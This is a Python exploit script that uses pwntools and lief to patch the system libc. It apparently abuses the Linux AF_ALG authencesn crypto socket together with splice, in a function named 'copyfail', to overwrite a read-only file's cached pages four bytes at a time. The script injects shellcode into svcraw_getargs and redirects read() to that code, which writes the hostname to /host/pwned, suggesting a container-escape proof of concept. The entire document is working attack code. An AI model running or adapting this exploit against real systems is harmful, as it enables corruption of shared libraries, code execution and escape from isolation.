import lief
from pwn import *
import os as g,socket as s

def d(x):return bytes.fromhex(x)
def copyfail(f,t,c, offset=0):
 a=s.socket(38,5,0);
 a.bind(("aead","authencesn(hmac(sha256),cbc(aes))"));
 h=279;
 v=a.setsockopt;
 v(h,1,d('0800010000000010'+'0'*64));
 v(h,5,None,4);
 u,_=a.accept();
 o=t+4;i=d('00');
 u.sendmsg([b"A"*4+c],[(h,3,i*4),(h,2,b'\x10'+i*19),(h,4,b'\x08'+i*3),],32768);
 r,w=g.pipe();
 n=g.splice;
 n(f,w,o,offset_src=offset);
 n(r,u.fileno(),o)
 try:u.recv(8+t)
 except:0
 a.close()
 g.close(r)
 g.close(w)

context.arch = "amd64"
context.os = "linux"

target_file = "/lib/x86_64-linux-gnu/libc.so.6"
target_symbol = "svcraw_getargs"
target_corrupt = "read"
target_corrupt_offset = 25

binary = lief.parse(target_file)
symbol = binary.get_symbol(target_symbol)
symbol_corrupt = binary.get_symbol(target_corrupt)

func_va = 0x000000000016e220 # symbol.value, undeclared
file_offset = binary.virtual_address_to_offset(func_va)
file_corrupt_offset = binary.virtual_address_to_offset(symbol_corrupt.value)

print(f"New code VA:      0x{func_va:x}")
print(f"New code Offset:  0x{file_offset:x}")

print(f"Overwrite VA:      0x{symbol_corrupt.value:x}")
print(f"Overwrite Offset:  0x{file_corrupt_offset:x}")

shellcode = asm(f"""
    push rax
    sub rsp, 390

    mov rax, 63          
    mov rdi, rsp         
    syscall

    lea r9, [rsp + 65]   

    mov rcx, r9
1:
    cmp byte ptr [rcx], 0
    je 2f
    inc rcx
    jmp 1b
2:
    sub rcx, r9          
    mov r8, rcx        

    mov rax, 2
    lea rdi, [rip + filename]
    mov rsi, 0x41        
    mov rdx, 0x1a4       
    syscall

    mov r10, rax         

    mov rdi, r10
    mov rax, 1           
    mov rsi, r9          
    mov rdx, r8          
    syscall

    mov rdi, r10
    mov rax, 3           
    syscall

    add rsp, 390

    pop rax
    ret
"""+r"""
filename:
    .ascii "/host/pwned\0"
""")

binary.patch_address(func_va, list(shellcode))
print(f'Function {target_symbol} patched -- total bytes: {len(shellcode)}')

# We overwrite the ret
shellcode_corrupt = asm(f"""
    lea rdi, [rip]
    add rdi, 0x{func_va - symbol_corrupt.value - 0x20:02x}
    jmp rdi
""")

binary.patch_address(symbol_corrupt.value + target_corrupt_offset, list(shellcode_corrupt))
print(f'Function {target_corrupt} patched -- total bytes: {len(shellcode_corrupt)}')
binary.write("libc-patched.so.6")

# Launching copyfail attack
target_file_to_patch = target_file # "/tmp/libc.so.6"
f=g.open(target_file_to_patch,0);i=0;
totalsize = g.path.getsize(target_file_to_patch)
print(f'{target_file_to_patch} => size:', totalsize)

with open('libc-patched.so.6', 'rb') as input_file:
    data = input_file.read()

bytecode = data[file_offset:file_offset+len(shellcode)+20]
print(f'Patching {target_symbol} => ({target_file_to_patch}) {len(bytecode)} bytes -- offset {file_offset}')
i = 0
while i<len(bytecode):
    copyfail(f,i,bytecode[i:i+4], offset=(file_offset))
    i+=4

print(f'Patching {target_corrupt} => ({target_file_to_patch}) {len(bytecode)} bytes -- offset {file_offset}')
i = 0
bytecode = data[(file_corrupt_offset+target_corrupt_offset):file_corrupt_offset+len(shellcode_corrupt)+10+target_corrupt_offset]
while i<len(bytecode):
    copyfail(f,i,bytecode[i:i+4], offset=file_corrupt_offset+target_corrupt_offset)
    i+=4
